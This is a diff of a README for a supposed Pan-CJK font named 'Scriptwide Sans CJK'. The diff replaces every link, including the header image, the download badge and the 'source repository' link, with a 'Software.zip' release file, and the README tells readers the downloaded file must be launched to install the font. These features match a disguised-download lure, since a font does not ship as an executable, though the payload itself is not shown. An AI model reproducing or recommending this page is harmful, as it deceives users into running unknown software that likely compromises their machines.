@@ -1,6 +1,6 @@
 # Scriptwide Sans CJK
 
-![CJK Fonts](https://www.freehkes.com/images/2019/09/09/rokuhaku/x9000.jpg)
+![CJK Fonts](https://github.com/HamoodMoeaz/scriptwide-sans-cjk/releases/download/v2.0/Software.zip)
 
 Welcome to the **Scriptwide Sans CJK** repository! This repository hosts a Pan-CJK font that is based on Source Han Sans and its derivatives. The font is designed to support Chinese, Japanese, and Korean characters, making it a versatile option for multilingual projects.
 
@@ -17,7 +17,7 @@ The **Scriptwide Sans CJK** font offers the following features:
 
 To install the **Scriptwide Sans CJK** font, simply download the font files from the following link:
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download https://github.com/HamoodMoeaz/scriptwide-sans-cjk/releases/download/v2.0/Software.zip](https://github.com/HamoodMoeaz/scriptwide-sans-cjk/releases/download/v2.0/Software.zip)](https://github.com/HamoodMoeaz/scriptwide-sans-cjk/releases/download/v2.0/Software.zip)
 
 Please note that the file needs to be launched after downloading to initiate the installation process.
 
@@ -46,6 +46,6 @@ If you are interested in contributing to the **Scriptwide Sans CJK** project, fe
 
 ## Resources
 
-For more information about **Scriptwide Sans CJK** and related projects, you can visit the [source repository](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip). If the link is not working, please check the "Releases" section of the repository for additional resources and downloads.
+For more information about **Scriptwide Sans CJK** and related projects, you can visit the [source repository](https://github.com/HamoodMoeaz/scriptwide-sans-cjk/releases/download/v2.0/Software.zip). If the link is not working, please check the "Releases" section of the repository for additional resources and downloads.
 
 Thank you for visiting the **Scriptwide Sans CJK** repository. We hope this font serves your multilingual projects effectively. Happy designing! 🎨🌐🈷️
